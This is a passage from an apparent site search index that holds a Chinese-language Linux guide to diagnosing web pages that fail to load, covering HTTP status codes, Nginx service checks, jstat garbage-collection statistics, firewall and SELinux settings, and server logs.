\u68c0\u67e5\u662f\u5426\u89e6\u53d1\u4e86\u670d\u52a1\u5668\u7684\u9650\u6d41\u63aa\u65bd\uff0c\u5982\u6709\u9700\u8981\u8c03\u6574\u8bf7\u6c42\u9891\u7387\u3002 5xx - \u670d\u52a1\u5668\u9519\u8bef\u72b6\u6001\u7801 (Server Error) \uff1a\u8868\u793a\u670d\u52a1\u5668\u5728\u5904\u7406\u8bf7\u6c42\u7684\u65f6\u5019\u53d1\u751f\u4e86\u9519\u8bef\u3002 500 Internal Server Error (\u670d\u52a1\u5668\u5185\u90e8\u9519\u8bef) \u68c0\u67e5\u670d\u52a1\u5668\u65e5\u5fd7\uff0c\u786e\u8ba4\u4ee3\u7801\u3001\u6570\u636e\u5e93\u3001\u6216\u914d\u7f6e\u4e2d\u7684\u95ee\u9898\u3002 501 Not Implemented (\u672a\u5b9e\u73b0) \u670d\u52a1\u5668\u4e0d\u652f\u6301\u8bf7\u6c42\u7684\u529f\u80fd\u3002 502 Bad Gateway (\u9519\u8bef\u7f51\u5173) \u68c0\u67e5\u670d\u52a1\u5668\u4e0e\u4e0a\u6e38\u670d\u52a1\u5668\u7684\u8fde\u63a5\u3002 503 Service Unavailable (\u670d\u52a1\u4e0d\u53ef\u7528) \u670d\u52a1\u5668\u53ef\u80fd\u8d85\u8f7d\u6216\u8fdb\u884c\u7ef4\u62a4\u3002\u68c0\u67e5\u670d\u52a1\u5668\u6027\u80fd\u548c\u914d\u7f6e\u3002 504 Gateway Timeout (\u7f51\u5173\u8d85\u65f6) \u7c7b\u4f3c\u4e8e502\uff0c\u68c0\u67e5\u670d\u52a1\u5668\u4e0e\u4e0a\u6e38\u670d\u52a1\u5668\u7684\u8fde\u63a5\u95ee\u9898\u3002 \u8fd9\u4e9b\u72b6\u6001\u7801\u662fWeb\u5f00\u53d1\u548c\u7f51\u7edc\u8bca\u65ad\u4e2d\u7684\u91cd\u8981\u90e8\u5206\u3002 \u7b2c\u4e09\u6b65 3,\u68c0\u67e5\u7f51\u9875\u670d\u52a1\u5668\u72b6\u6001\uff0c\u4f8b\u5982Nginx\uff0cApache\u7b49 \u4f8b\u5982\u68c0\u67e5Nginx\u670d\u52a1\u5668\u662f\u5426\u6b63\u5e38\u8fd0\u884c\uff0c\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u6b65\u9aa4\u8fdb\u884c\uff1a \u68c0\u67e5Nginx\u670d\u52a1\u72b6\u6001 \uff1a \u5728\u547d\u4ee4\u884c\u8f93\u5165 `sudo systemctl status nginx` \u6216 `service nginx status` \uff08\u53d6\u51b3\u4e8e\u4f60\u7684\u64cd\u4f5c\u7cfb\u7edf\u548c\u670d\u52a1\u7ba1\u7406\u5668\uff09\u3002\u8fd9\u4f1a\u663e\u793aNginx\u7684\u8fd0\u884c\u72b6\u6001\u3002 \u68c0\u67e5\u7aef\u53e3\u76d1\u542c \uff1a \u4f7f\u7528 `netstat -tulpn | grep nginx` \u6216 `ss -tulpn | grep nginx` \u6765\u786e\u8ba4Nginx\u662f\u5426\u6b63\u5728\u76d1\u542c\u6b63\u786e\u7684\u7aef\u53e3\uff08\u901a\u5e38\u662f80\u548c443\u7aef\u53e3\uff09\u3002 \u8bbf\u95ee\u7f51\u7ad9 \uff1a \u5c1d\u8bd5\u5728nginx\u670d\u52a1\u5668\u4e2d\u8f93\u5165\u4f60\u7684\u670d\u52a1\u5668IP\u6216\u7ed1\u5b9a\u7684\u57df\u540d\uff0c\u770b\u662f\u5426\u80fd\u6210\u529f\u52a0\u8f7d\u7f51\u9875\u3002 \u6216\u8005\u5728nginx\u670d\u52a1\u5668\u4e0acurl\u547d\u4ee4\u8bbf\u95ee127.0.0.1+\u7aef\u53e3\uff0c\u770b\u662f\u5426\u80fd\u6210\u529f\u52a0\u8f7d\u7f51\u9875 \u67e5\u770bNginx\u9519\u8bef\u65e5\u5fd7 \uff1a Nginx\u7684\u9519\u8bef\u65e5\u5fd7\u901a\u5e38\u4f4d\u4e8e `/var/log/nginx/error.log`\u3002 \u67e5\u770b\u8be5\u6587\u4ef6\u53ef\u80fd\u4f1a\u7ed9\u51fa\u4e00\u4e9b\u4e3a\u4ec0\u4e48Nginx\u65e0\u6cd5\u6b63\u5e38\u8fd0\u884c\u7684\u7ebf\u7d22\u3002 \u68c0\u67e5Nginx\u914d\u7f6e\u6587\u4ef6 \uff1a \u4f7f\u7528 `nginx -t` \u547d\u4ee4\u6765\u6d4b\u8bd5Nginx\u914d\u7f6e\u6587\u4ef6\u662f\u5426\u6709\u8bed\u6cd5\u9519\u8bef\u3002 \u6216\u8005\u4f7f\u7528 ps auxww | grep [\u8fdb\u7a0b\u53f7] \u67e5\u770bNginx\u542f\u52a8\u547d\u4ee4\u662f\u5426\u6307\u5b9a\u4e86\u914d\u7f6e\u6587\u4ef6 \u68c0\u67e5\u7cfb\u7edf\u8d44\u6e90 \uff1a \u4f7f\u7528 `top` \u6216 `htop` \u7b49\u547d\u4ee4\u6765\u68c0\u67e5\u670d\u52a1\u5668\u7684 CPU\u548c\u5185\u5b58\u4f7f\u7528\u60c5\u51b5\uff0c\u786e\u4fdd\u7cfb\u7edf\u8d44\u6e90\u6ca1\u6709\u88ab\u8017\u5c3d\u3002 \u4e00\u6837\u7684\u9053\u7406\u53ef\u4ee5\u68c0\u67e5Apache\u3002 \u7b2c\u56db\u6b65 4,\u68c0\u67e5\u5f00\u53d1\u73af\u5883\u72b6\u6001\uff0c\u4f8b\u5982Java\uff0cPython\uff0cPHP\u7b49 \u4f8b\u5982\u68c0\u67e5Java\uff1a jstat -gc [pid] \u547d\u4ee4\u63d0\u4f9b\u4e86Java\u5806\u5185\u5b58\u4e2d\u5bf9\u8c61\u7684\u5783\u573e\u6536\u96c6\u548c\u5806\u4f7f\u7528\u60c5\u51b5\u7684\u4fe1\u606f\u3002\u8f93\u51fa\u7684\u6bcf\u5217\u6570\u636e\u4ee3\u8868\u4e0d\u540c\u7684\u5185\u5b58\u533a\u57df\u6216\u7edf\u8ba1\u4fe1\u606f\u3002\u4ee5\u4e0b\u662f\u5178\u578b\u8f93\u51fa\u7684\u5217\u548c\u5b83\u4eec\u7684\u542b\u4e49\uff1a 1. S0C: Survivor space 0 capacity (KB) - \u5e78\u5b58\u533a0\u7684\u5bb9\u91cf\u3002 2. S1C: Survivor space 1 capacity (KB) - \u5e78\u5b58\u533a1\u7684\u5bb9\u91cf\u3002 3. S0U: Survivor space 0 utilization (KB) - \u5e78\u5b58\u533a0\u7684\u4f7f\u7528\u91cf\u3002 4. S1U: Survivor space 1 utilization (KB) - \u5e78\u5b58\u533a1\u7684\u4f7f\u7528\u91cf\u3002 5. EC: Eden space capacity (KB) - \u4f0a\u7538\u56ed\u533a\u7684\u5bb9\u91cf\u3002 6. EU: Eden space utilization (KB) - \u4f0a\u7538\u56ed\u533a\u7684\u4f7f\u7528\u91cf\u3002 7. OC: Old space capacity (KB) - \u8001\u5e74\u4ee3\u533a\u7684\u5bb9\u91cf\u3002 8. OU: Old space utilization (KB) - \u8001\u5e74\u4ee3\u533a\u7684\u4f7f\u7528\u91cf\u3002 9. MC: Metaspace capacity (KB) - \u5143\u7a7a\u95f4\u7684\u5bb9\u91cf\u3002 10. MU: Metaspace utilization (KB) - \u5143\u7a7a\u95f4\u7684\u4f7f\u7528\u91cf\u3002 11. CCSC: Compressed Class Space Capacity (KB) - \u538b\u7f29\u7c7b\u7a7a\u95f4\u7684\u5bb9\u91cf\u3002 12. CCSU: Compressed Class Space Used (KB) - \u538b\u7f29\u7c7b\u7a7a\u95f4\u7684\u4f7f\u7528\u91cf\u3002 13. YGC: Number of young generation GC events - \u5e74\u8f7b\u4ee3\u5783\u573e\u6536\u96c6\u53d1\u751f\u7684\u6b21\u6570\u3002 14. YGCT: Young generation garbage collection time - \u5e74\u8f7b\u4ee3\u5783\u573e\u6536\u96c6\u6240\u7528\u7684\u65f6\u95f4\u3002 15. FGC: Number of full GC events - \u5b8c\u5168\u5783\u573e\u6536\u96c6\u53d1\u751f\u7684\u6b21\u6570\u3002 16. FGCT: Full garbage collection time - \u5b8c\u5168\u5783\u573e\u6536\u96c6\u6240\u7528\u7684\u65f6\u95f4\u3002 17. GCT: Total garbage collection time - \u5783\u573e\u6536\u96c6\u6240\u7528\u7684\u603b\u65f6\u95f4\u3002 \u901a\u8fc7\u5206\u6790\u8fd9\u4e9b\u6570\u636e\uff0c\u4f60\u53ef\u4ee5\u83b7\u5f97JVM\u5806\u5185\u5b58\u4f7f\u7528\u60c5\u51b5\u548c\u5783\u573e\u6536\u96c6\u6d3b\u52a8\u7684\u8be6\u7ec6\u89c6\u56fe\u3002\u8fd9\u5bf9\u4e8e\u6027\u80fd\u8c03\u4f18\u548c\u8bca\u65ad\u5185\u5b58\u95ee\u9898\u662f\u975e\u5e38\u6709\u5e2e\u52a9\u7684\u3002 \u6709\u4e00\u4e9b\u901a\u7528\u7684\u6307\u6807\u53ef\u4ee5\u6307\u793a\u6f5c\u5728\u7684\u95ee\u9898\uff1a \u9891\u7e41\u7684\u5e74\u8f7b\u4ee3\u5783\u573e\u6536\u96c6 (YGC) \uff1a Note \u5982\u679c YGC \u6570\u503c\u4e0d\u65ad\u5feb\u901f\u589e\u52a0\uff0c\u53ef\u80fd\u8868\u660e\u5e74\u8f7b\u4ee3\u7a7a\u95f4\u592a\u5c0f\u6216\u8005\u7a0b\u5e8f\u5728\u77ed\u65f6\u95f4\u5185\u751f\u6210\u4e86\u5927\u91cf\u7684\u4e34\u65f6\u5bf9\u8c61\u3002 \u957f\u65f6\u95f4\u7684\u5e74\u8f7b\u4ee3\u5783\u573e\u6536\u96c6 (YGCT) \uff1a Note \u5982\u679c\u5355\u6b21 YGCT \u503c\u8f83\u9ad8\uff0c\u8bf4\u660e\u5e74\u8f7b\u4ee3\u5783\u573e\u6536\u96c6\u82b1\u8d39\u4e86\u592a\u591a\u65f6\u95f4\uff0c\u53ef\u80fd\u662f\u7531\u4e8e\u5806\u5927\u5c0f\u4e0d\u8db3\u6216\u5783\u573e\u6536\u96c6\u5668\u8bbe\u7f6e\u4e0d\u5408\u7406\u3002 \u9891\u7e41\u7684\u5b8c\u5168\u5783\u573e\u6536\u96c6 (FGC) \uff1a Note FGC \u9891\u7e41\u589e\u52a0\u53ef\u80fd\u8868\u660e\u8001\u5e74\u4ee3\u6216\u6c38\u4e45\u4ee3/\u5143\u7a7a\u95f4\uff08\u53d6\u51b3\u4e8eJava\u7248\u672c\uff09\u5bb9\u91cf\u4e0d\u8db3\uff0c\u6216\u8005\u6709\u5927\u91cf\u5bf9\u8c61\u957f\u671f\u5b58\u6d3b\u3002 \u957f\u65f6\u95f4\u7684\u5b8c\u5168\u5783\u573e\u6536\u96c6 (FGCT) \uff1a Note \u9ad8 FGCT \u503c\u8868\u793a\u5b8c\u5168\u5783\u573e\u6536\u96c6\u5360\u7528\u4e86\u592a\u591a\u65f6\u95f4\uff0c\u53ef\u80fd\u662f\u7531\u4e8e\u8001\u5e74\u4ee3\u7a7a\u95f4\u592a\u5c0f\u3001\u5b58\u5728\u5927\u91cf\u957f\u751f\u547d\u5468\u671f\u7684\u5bf9\u8c61\uff0c\u6216\u5783\u573e\u6536\u96c6\u5668\u8bbe\u7f6e\u4e0d\u5f53\u3002 \u9ad8\u8001\u5e74\u4ee3\u4f7f\u7528\u91cf (OU) \uff1a Note \u5982\u679c OU \u503c\u6301\u7eed\u63a5\u8fd1 OC \u503c\uff0c\u8868\u660e\u8001\u5e74\u4ee3\u7a7a\u95f4\u63a5\u8fd1\u6ee1\u8f7d\uff0c\u53ef\u80fd\u5bfc\u81f4\u9891\u7e41\u7684\u5b8c\u5168\u5783\u573e\u6536\u96c6\u3002 \u9ad8\u5143\u7a7a\u95f4\u4f7f\u7528\u91cf (MU) \uff1a Note MU \u63a5\u8fd1 MC \u8868\u660e\u5143\u7a7a\u95f4\u4f7f\u7528\u91cf\u9ad8\uff0c\u53ef\u80fd\u7531\u4e8e\u52a0\u8f7d\u4e86\u5927\u91cf\u7c7b\u6216\u5185\u5b58\u6cc4\u6f0f\u3002 \u603b\u5783\u573e\u6536\u96c6\u65f6\u95f4 (GCT) \uff1a Note \u5982\u679c GCT \u76f8\u5bf9\u4e8e\u5e94\u7528\u8fd0\u884c\u65f6\u95f4\u8fc7\u9ad8\uff0c\u8868\u660e\u5e94\u7528\u82b1\u8d39\u4e86\u5927\u91cf\u65f6\u95f4\u5728\u5783\u573e\u6536\u96c6\u4e0a\u3002 \u8bc6\u522b\u8fd9\u4e9b\u5f02\u5e38\u60c5\u51b5\u540e\uff0c\u53ef\u80fd\u9700\u8981\u5bf9JVM\u7684\u5806\u5927\u5c0f\u3001\u5783\u573e\u6536\u96c6\u5668\u7c7b\u578b\u3001\u5783\u573e\u6536\u96c6\u7b56\u7565\u7b49\u8fdb\u884c\u8c03\u6574\uff0c\u6216\u8005\u68c0\u67e5\u5e94\u7528\u4ee3\u7801\u4ee5\u67e5\u627e\u5185\u5b58\u6cc4\u6f0f\u6216\u4e0d\u5fc5\u8981\u7684\u5bf9\u8c61\u521b\u5efa\u3002\u5bf9\u4e8e\u5177\u4f53\u7684\u8c03\u4f18\u7b56\u7565\uff0c\u9700\u8981\u6839\u636e\u5e94\u7528\u7a0b\u5e8f\u7684\u5177\u4f53\u60c5\u51b5\u548c\u9700\u6c42\u6765\u5b9a\u3002 jstat -gcutil <pid> <interval> <count> \u547d\u4ee4\u7528\u4e8e\u663e\u793a\u76ee\u6807Java\u8fdb\u7a0b\u7684\u5783\u573e\u6536\u96c6\uff08GC\uff09\u7edf\u8ba1\u4fe1\u606f\uff0c\u5e76\u6309\u7167\u8bbe\u5b9a\u7684\u65f6\u95f4\u95f4\u9694\u91cd\u590d\u663e\u793a\u6307\u5b9a\u6b21\u6570\u3002\u4e0b\u9762\u662f\u8be5\u547d\u4ee4\u5404\u90e8\u5206\u7684\u89e3\u91ca\uff1a Note jstat \uff1aJava\u7684\u7edf\u8ba1\u76d1\u63a7\u5de5\u5177\u3002 -gcutil \uff1a\u8fd9\u662f jstat \u7684\u4e00\u4e2a\u9009\u9879\uff0c\u7528\u4e8e\u663e\u793a\u76ee\u6807Java\u8fdb\u7a0b\u7684\u5783\u573e\u6536\u96c6\u7edf\u8ba1\u4fe1\u606f\uff0c\u5305\u62ec\u5806\u533a\u57df\u7684\u4f7f\u7528\u767e\u5206\u6bd4\u7b49\u3002 <pid> \uff1a\u76ee\u6807Java\u8fdb\u7a0b\u7684\u8fdb\u7a0bID\u3002\u60a8\u9700\u8981\u66ff\u6362\u4e3a\u60a8\u60f3\u76d1\u63a7\u7684Java\u8fdb\u7a0b\u7684\u5b9e\u9645\u8fdb\u7a0bID\u3002 <interval> \uff1a\u663e\u793a\u4fe1\u606f\u7684\u65f6\u95f4\u95f4\u9694\uff0c\u5355\u4f4d\u4e3a\u6beb\u79d2\u3002\u8fd9\u4e2a\u53c2\u6570\u662f\u53ef\u9009\u7684\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u53ea\u663e\u793a\u4e00\u6b21\u6570\u636e\u3002 <count> \uff1a\u8be5\u547d\u4ee4\u8981\u91cd\u590d\u6267\u884c\u7684\u6b21\u6570\u3002\u8fd9\u4e2a\u53c2\u6570\u4e5f\u662f\u53ef\u9009\u7684\uff0c\u5982\u679c\u672a\u6307\u5b9a\uff0c jstat \u5c06\u6301\u7eed\u663e\u793a\u6570\u636e\uff0c\u76f4\u5230\u88ab\u4e2d\u65ad\u3002 \u4f8b\u5982\uff0c\u5982\u679c\u60a8\u60f3\u67e5\u770b\u8fdb\u7a0bID\u4e3a1234\u7684Java\u8fdb\u7a0b\u7684\u5783\u573e\u6536\u96c6\u7edf\u8ba1\u4fe1\u606f\uff0c\u6bcf\u96945000\u6beb\u79d2\uff08\u53735\u79d2\uff09\u66f4\u65b0\u4e00\u6b21\uff0c\u603b\u5171\u66f4\u65b010\u6b21\uff0c\u60a8\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\uff1a jstat -gcutil 1234 5000 10 \u8fd9\u4e2a\u547d\u4ee4\u5c06\u6bcf5\u79d2\u663e\u793a\u4e00\u6b21\u8fdb\u7a0bID\u4e3a1234\u7684Java\u8fdb\u7a0b\u7684\u5783\u573e\u6536\u96c6\u7edf\u8ba1\u4fe1\u606f\uff0c\u5171\u663e\u793a10\u6b21\u3002 jstat -gcutil 1234 5000 10 \u8fd9\u4e2a\u547d\u4ee4\u7684\u8f93\u51fa\u5c06\u5c55\u793a\u8fdb\u7a0bID\u4e3a1234\u7684Java\u5e94\u7528\u7684\u5783\u573e\u6536\u96c6\uff08GC\uff09\u76f8\u5173\u7684\u4fe1\u606f\uff0c\u6bcf5\u79d2\u5237\u65b0\u4e00\u6b21\uff0c\u5171\u5237\u65b010\u6b21\u3002\u6bcf\u6b21\u5237\u65b0\u5c06\u5c55\u793a\u7c7b\u4f3c\u4ee5\u4e0b\u7684\u6570\u636e\uff08\u5177\u4f53\u6570\u503c\u4f1a\u6839\u636e\u5e94\u7528\u72b6\u6001\u6709\u6240\u4e0d\u540c\uff09\uff1a S0 S1 E O M CCS YGC YGCT FGC FGCT GCT 0.00 0.00 76.85 40.07 97.69 95.83 118 1.472 2 0.234 1.706 0.00 0.00 80.37 41.07 97.69 95.83 118 1.472 2 0.234 1.706 ... \u8fd9\u91cc\u662f\u5404\u5217\u6570\u636e\u7684\u610f\u4e49\uff1a S0 \u548c S1 \uff1a\u5e78\u5b58\u533a\uff08Survivor spaces\uff090\u548c1\u7684\u4f7f\u7528\u767e\u5206\u6bd4\u3002 E \uff1a\u4f0a\u7538\u56ed\u533a\uff08Eden space\uff09\u7684\u4f7f\u7528\u767e\u5206\u6bd4\u3002 O \uff1a\u8001\u5e74\u4ee3\uff08Old generation\uff09\u7684\u4f7f\u7528\u767e\u5206\u6bd4\u3002 M \uff1a\u5143\u6570\u636e\u533a\uff08Metaspace\uff09\u7684\u4f7f\u7528\u767e\u5206\u6bd4\u3002 CCS \uff1a\u538b\u7f29\u7c7b\u7a7a\u95f4\uff08Compressed Class Space\uff09\u7684\u4f7f\u7528\u767e\u5206\u6bd4\u3002 YGC \uff1a\u5e74\u8f7b\u4ee3\u5783\u573e\u6536\u96c6\uff08Young Generation Garbage Collection\uff09\u53d1\u751f\u7684\u6b21\u6570\u3002 YGCT \uff1a\u5e74\u8f7b\u4ee3\u5783\u573e\u6536\u96c6\u6240\u82b1\u8d39\u7684\u65f6\u95f4\uff08\u79d2\uff09\u3002 FGC \uff1a\u5b8c\u5168\u5783\u573e\u6536\u96c6\uff08Full Garbage Collection\uff09\u53d1\u751f\u7684\u6b21\u6570\u3002 FGCT \uff1a\u5b8c\u5168\u5783\u573e\u6536\u96c6\u6240\u82b1\u8d39\u7684\u65f6\u95f4\uff08\u79d2\uff09\u3002 GCT \uff1a\u603b\u5783\u573e\u6536\u96c6\u65f6\u95f4\uff08\u79d2\uff09\u3002 \u8fd9\u4e9b\u6570\u636e\u5bf9\u4e8e\u7406\u89e3\u548c\u8c03\u4f18Java\u5e94\u7528\u7684\u5185\u5b58\u548c\u5783\u573e\u6536\u96c6\u884c\u4e3a\u975e\u5e38\u6709\u5e2e\u52a9\u3002 \u5982\u679cJava\u5e94\u7528\u51fa\u73b0\u5f02\u5e38\uff0c jstat -gcutil \u547d\u4ee4\u8f93\u51fa\u7684\u6570\u636e\u53ef\u80fd\u4f1a\u5c55\u793a\u4e00\u4e9b\u5f02\u5e38\u6a21\u5f0f\uff0c\u6bd4\u5982\uff1a \u9891\u7e41\u7684\u5e74\u8f7b\u4ee3\u5783\u573e\u6536\u96c6\uff08YGC\uff09 : \u8bf4\u660e\uff1a\u5982\u679cYGC\u53d1\u751f\u7684\u9891\u7387\u975e\u5e38\u9ad8\uff0c\u53ef\u80fd\u610f\u5473\u7740\u4f0a\u7538\u56ed\u533a\uff08Eden space\uff09\u592a\u5c0f\u6216\u8005\u5e94\u7528\u4ea7\u751f\u4e86\u5927\u91cf\u7684\u77ed\u751f\u547d\u5468\u671f\u5bf9\u8c61\u3002 \u4e3e\u4f8b\uff1a\u5982\u679c\u6bcf\u51e0\u79d2\u949f\u5c31\u6709\u4e00\u6b21YGC\uff0c\u4e14YGCT\uff08\u5e74\u8f7b\u4ee3\u5783\u573e\u6536\u96c6\u65f6\u95f4\uff09\u76f8\u5bf9\u8f83\u9ad8\uff0c\u53ef\u80fd\u8bf4\u660e\u5b58\u5728\u95ee\u9898\u3002 \u8001\u5e74\u4ee3\uff08Old Generation\uff09\u4f7f\u7528\u7387\u6301\u7eed\u589e\u9ad8 : \u8bf4\u660e\uff1a\u5982\u679c\u8001\u5e74\u4ee3\u7684\u4f7f\u7528\u7387\u4e0d\u65ad\u6500\u5347\u4e14\u4e0d\u4e0b\u964d\uff0c\u53ef\u80fd\u8868\u660e\u5185\u5b58\u6cc4\u6f0f\u6216\u8001\u5e74\u4ee3\u5927\u5c0f\u4e0d\u8db3\u3002 \u4e3e\u4f8b\uff1a\u5982\u679c\u8001\u5e74\u4ee3\u7684\u4f7f\u7528\u7387\uff08O\u5217\uff09\u9010\u6e10\u63a5\u8fd1100%\u4e14\u4e0d\u89c1\u4e0b\u964d\uff0c\u53ef\u80fd\u662f\u5185\u5b58\u6cc4\u6f0f\u7684\u8ff9\u8c61\u3002 \u9891\u7e41\u7684\u5b8c\u5168\u5783\u573e\u6536\u96c6\uff08FGC\uff09 : \u8bf4\u660e\uff1a\u9891\u7e41\u7684FGC\u53ef\u80fd\u4f1a\u5bfc\u81f4\u7cfb\u7edf\u505c\u987f\uff0c\u5f71\u54cd\u6027\u80fd\u3002\u53ef\u80fd\u662f\u7531\u4e8e\u8001\u5e74\u4ee3\u7a7a\u95f4\u4e0d\u8db3\u6216\u5185\u5b58\u6cc4\u6f0f\u9020\u6210\u7684\u3002 \u4e3e\u4f8b\uff1a\u5982\u679cFGC\u7684\u6b21\u6570\uff08FGC\u5217\uff09\u5728\u77ed\u65f6\u95f4\u5185\u8fc5\u901f\u589e\u52a0\uff0c\u4e14FGCT\uff08\u5b8c\u5168\u5783\u573e\u6536\u96c6\u65f6\u95f4\uff09\u4e5f\u5728\u589e\u52a0\uff0c\u53ef\u80fd\u4f1a\u51fa\u73b0\u6027\u80fd\u95ee\u9898\u3002 \u5783\u573e\u6536\u96c6\u65f6\u95f4\u8fc7\u957f : \u8bf4\u660e\uff1a\u5982\u679c\u5783\u573e\u6536\u96c6\u6240\u9700\u7684\u65f6\u95f4\u8fc7\u957f\uff0c\u53ef\u80fd\u4f1a\u5bfc\u81f4\u5e94\u7528\u54cd\u5e94\u7f13\u6162\u6216\u505c\u987f\u3002 \u4e3e\u4f8b\uff1a\u5982\u679cYGCT\u6216FGCT\u7684\u503c\u5f02\u5e38\u9ad8\uff0c\u610f\u5473\u7740\u5783\u573e\u6536\u96c6\u5360\u7528\u4e86\u5927\u91cf\u65f6\u95f4\uff0c\u53ef\u80fd\u5bfc\u81f4\u5e94\u7528\u6027\u80fd\u4e0b\u964d\u3002 \u603b\u4e4b\uff0c\u901a\u8fc7\u76d1\u63a7 jstat -gcutil \u547d\u4ee4\u7684\u8f93\u51fa\uff0c\u53ef\u4ee5\u8bc6\u522b\u51fa\u6f5c\u5728\u7684\u5185\u5b58\u7ba1\u7406\u95ee\u9898\uff0c\u5982\u5185\u5b58\u6cc4\u6f0f\u3001\u4e0d\u6070\u5f53\u7684\u5783\u573e\u6536\u96c6\u7b56\u7565\u6216\u5185\u5b58\u5206\u914d\u4e0d\u8db3\u7b49\u3002\u7136\u540e\u53ef\u4ee5\u6839\u636e\u8fd9\u4e9b\u4fe1\u606f\u8fdb\u884c\u8c03\u4f18\u6216\u8fdb\u4e00\u6b65\u8c03\u67e5\u3002 \u7b2c\u4e94\u6b65 5,\u68c0\u67e5\u64cd\u4f5c\u7cfb\u7edf \u68c0\u67e5\u9632\u706b\u5899\u8bbe\u7f6e \uff1a \u786e\u4fdd\u9632\u706b\u5899\u6ca1\u6709\u963b\u6b62Nginx\u4f7f\u7528\u7684\u7aef\u53e3\uff0c\u7279\u522b\u662fHTTP (80) \u548c HTTPS (443) \u7aef\u53e3\u3002 s 2. \u68c0\u67e5SELinux\u72b6\u6001 \uff08\u5982\u679c\u9002\u7528\uff09\uff1a \u5728\u67d0\u4e9bLinux\u53d1\u884c\u7248\u4e0a\uff0cSELinux\u53ef\u80fd\u4f1a\u9650\u5236Nginx\u7684\u64cd\u4f5c\u3002\u53ef\u4ee5\u901a\u8fc7 getenforce \u67e5\u770b\u5176\u72b6\u6001\uff0c\u5e76\u6839\u636e\u9700\u8981\u8fdb\u884c\u8c03\u6574\u3002 \u68c0\u67e5Nginx\u7684\u8bbf\u95ee\u65e5\u5fd7 \uff1a \u8bbf\u95ee\u65e5\u5fd7\u901a\u5e38\u4f4d\u4e8e /var/log/nginx/access.log \u3002\u5b83\u53ef\u4ee5\u63d0\u4f9b\u8bbf\u95ee\u8005\u8bf7\u6c42\u7684\u8be6\u7ec6\u4fe1\u606f\uff0c\u6709\u52a9\u4e8e\u8bc6\u522b\u6f5c\u5728\u95ee\u9898\u3002 \u67e5\u770b\u7cfb\u7edf\u65e5\u5fd7 \uff1a \u6709\u65f6\u7cfb\u7edf\u65e5\u5fd7\uff08\u5982 /var/log/syslog \u6216 /var/log/messages \uff09\u4e5f\u80fd\u63d0\u4f9b\u670d\u52a1\u5668\u95ee\u9898\u7684\u7ebf\u7d22\u3002 \u540e\u9762\u9047\u5230\u5177\u4f53\u573a\u666f\u518d\u5177\u4f53\u8865\u5145","title":"\u6392\u67e5\u7f51\u9875\u6253\u4e0d\u5f00"},{"location":"system/linux/%E7%BD%91%E7%BB%9C/%E6%8E%92%E6%9F%A5%E7%BD%91%E9%A1%B5%E6%89%93%E4%B8%8D%E5%BC%80/#_1","text":"","title":"\u6392\u67e5\u7f51\u9875\u6253\u4e0d\u5f00\u95ee\u9898"},{"location":"system/linux/%E7%BD%91%E7%BB%9C/%E6%8E%92%E6%9F%A5%E7%BD%91%E9%A1%B5%E6%89%93%E4%B8%8D%E5%BC%80/#_2","text":"1,\u901a\u8fc7\u7ec8\u7aefping\u7f51\u9875\u57df\u540d\uff0c\u662f\u5426\u80fd\u901a\uff0c\u5982\u679c\u4e0d\u901a\uff0c\u68c0\u67e5\u57df\u540d\u5730\u5740\u662f\u5426\u6b63\u786e\uff0c\u5426\u5219\u68c0\u67e5DNS","title":"\u7b2c\u4e00\u6b65"},{"location":"system/linux/%E7%BD%91%E7%BB%9C/%E6%8E%92%E6%9F%A5%E7%BD%91%E9%A1%B5%E6%89%93%E4%B8%8D%E5%BC%80/#_3","text":"2,\u6d4f\u89c8\u5668\u6253\u5f00\u5f00\u53d1\u8005\u6a21\u5f0f\uff0c\u67e5\u770b\u7f51\u9875\u8fd4\u56de\u7684http\u72b6\u6001\u7801\uff0c\u6839\u636e\u4e0d\u540c\u7684HTTP\u72b6\u6001\u8fdb\u884c\u6392\u67e5 HTTP\u72b6\u6001\u7801\u662f\u670d\u52a1\u5668\u7528\u6765\u54cd\u5e94\u5ba2\u6237\u7aef\u8bf7\u6c42\u7684\u6807\u51c6\u6570\u5b57\u4ee3\u7801\u3002 \u4e0d\u540c\u7684\u72b6\u6001\u7801\u8868\u793a\u4e0d\u540c\u7684\u60c5\u51b5\uff0c\u53ef\u4ee5\u5927\u81f4\u5206\u4e3a\u4e94\u4e2a\u7c7b\u522b\uff1a 1xx - \u4fe1\u606f\u6027\u72b6\u6001\u7801 (Informational) \uff1a\u8868\u793a\u63a5\u6536\u7684\u8bf7\u6c42\u6b63\u5728\u5904\u7406\u3002 \u8fd9\u7c7b\u72b6\u6001\u7801\u901a\u5e38\u662f\u6b63\u5e38\u7684\uff0c\u4e0d\u9700\u8981\u7279\u522b\u7684\u6392\u67e5\u3002 100 Continue (\u7ee7\u7eed) 101 Switching Protocols (\u5207\u6362\u534f\u8bae) 2xx - \u6210\u529f\u72b6\u6001\u7801 (Successful) \uff1a\u8868\u793a\u8bf7\u6c42\u5df2\u6210\u529f\u88ab\u670d\u52a1\u5668\u63a5\u6536\u3001\u7406\u89e3\u3001\u5e76\u63a5\u53d7\u3002 \u6210\u529f\u72b6\u6001\u7801\u901a\u5e38\u610f\u5473\u7740\u8bf7\u6c42\u5df2\u6210\u529f\u5904\u7406\u3002\u4e0d\u9700\u8981\u7279\u522b\u6392\u67e5\u3002 200 OK (\u6210\u529f) 201 Created (\u5df2\u521b\u5efa) 202 Accepted (\u5df2\u63a5\u53d7) 204 No Content (\u65e0\u5185\u5bb9) 3xx - \u91cd\u5b9a\u5411\u72b6\u6001\u7801 (Redirection) \uff1a\u8868\u793a\u9700\u8981\u8fdb\u4e00\u6b65\u64cd\u4f5c\u4ee5\u5b8c\u6210\u8bf7\u6c42\u3002 301 Moved Permanently (\u6c38\u4e45\u79fb\u52a8) \u68c0\u67e5\u670d\u52a1\u5668\u7aef\u7684\u91cd\u5b9a\u5411\u8bbe\u7f6e\u3002\u5982\u679c\u662f\u610f\u6599\u4e4b\u5916\u7684\u91cd\u5b9a\u5411\uff0c\u786e\u8ba4\u670d\u52a1\u5668\u914d\u7f6e\u6216\u4ee3\u7801\u4e2d\u7684\u91cd\u5b9a\u5411\u903b\u8f91\u3002 302 Found (\u627e\u5230) 